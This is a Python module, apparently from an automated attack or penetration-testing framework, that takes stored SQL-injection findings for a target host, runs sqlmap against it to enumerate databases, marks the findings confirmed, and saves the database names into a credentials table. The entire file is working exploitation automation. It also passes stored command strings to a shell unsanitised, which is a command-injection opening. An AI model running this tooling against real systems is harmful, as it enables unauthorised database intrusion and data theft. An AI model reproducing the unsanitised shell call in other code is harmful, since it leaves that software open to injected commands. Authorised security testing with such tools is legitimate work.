
import subprocess
import re
from utils import log_message
import database as db
from modules.base_module import ExploitationModule

class SqlmapExecutorModule(ExploitationModule):
    def __init__(self):
        super().__init__()
        self.name = "SQLmap Executor"
        self.description = "Executes SQL_INJECTION_COMMAND vulnerabilities using sqlmap."

    def run(self, target_id):
        """
        Attempts to exploit SQL injection vulnerabilities found in the database.
        """
        target = db.get_target_by_id(target_id)
        if not target:
            log_message("error", f"[{self.name}] Exploitation failed: Could not find target with ID {target_id} in KB.")
            return {"status": "failure", "reason": "target_not_found"}

        host = target['hostname']
        # This module only cares about the vulnerabilities it can handle
        potential_vulns = db.get_potential_vulnerabilities(target_id)
        sql_vulns = [v for v in potential_vulns if v['type'] == "SQL_INJECTION_COMMAND"]

        log_message("info", f"[{self.name}] Evaluating {len(sql_vulns)} potential SQLi exploits for {host}.")

        if not sql_vulns:
            return {"status": "failure", "reason": "no_vulns_for_this_module"}

        for vuln in sql_vulns:
            result = self._run_sqlmap_exploit(vuln, host, target_id)
            if result.get("status") == "success":
                return result # Return immediately on first success
        
        return {"status": "failure", "reason": "all_attempts_failed"}

    def _run_sqlmap_exploit(self, vuln, host, target_id):
        vuln_id = vuln['id']
        command = vuln['command'] + " --dbs"
        log_message("critical", f"[{self.name}] Executing attack on {host} (Vuln ID: {vuln_id}): {command}")
        
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True, timeout=600
            )

            if "vulnerable" in result.stdout.lower():
                log_message("critical", f"[{self.name}] SQLMAP on {host} CONFIRMED vulnerable.")
                db.update_vulnerability_status(vuln_id, 'confirmed')
                
                extracted_dbs = self._parse_sqlmap_output(result.stdout)
                if extracted_dbs:
                    db.add_credentials(
                        target_id=target_id,
                        service="sql_databases",
                        password=", ".join(extracted_dbs),
                        source=self.name
                    )
                return {"status": "success"}
            else:
                log_message("warning", f"[{self.name}] SQLMAP on {host} did not report injectable. Marking as failed.")
                db.update_vulnerability_status(vuln_id, 'failed')
                return {"status": "failure", "reason": "not_vulnerable"}

        except subprocess.TimeoutExpired:
            log_message("error", f"[{self.name}] Command timed out for {host}. Marking as failed.")
            db.update_vulnerability_status(vuln_id, 'failed')
            return {"status": "failure", "reason": "timeout"}
        except Exception as e:
            log_message("error", f"[{self.name}] Error during exploit for vuln {vuln_id}: {e}")
            db.update_vulnerability_status(vuln_id, 'failed')
            return {"status": "failure", "reason": "exception"}

    def _parse_sqlmap_output(self, stdout):
        databases = []
        db_regex = re.compile(r"^\*\s+(.*?)\s*$", re.MULTILINE)
        if "available databases" in stdout.lower():
            db_list_section = re.search(r"available databases\s*([\s\S]*?)(?=\[CRITICAL\]|\n\n|\Z)", stdout, re.IGNORECASE)
            if db_list_section:
                matches = db_regex.findall(db_list_section.group(1))
                if matches:
                    databases = [db.strip() for db in matches if not db.startswith('(')]
                    log_message("info", f"[{self.name}] Parsed databases from sqlmap output: {databases}")
        return databases
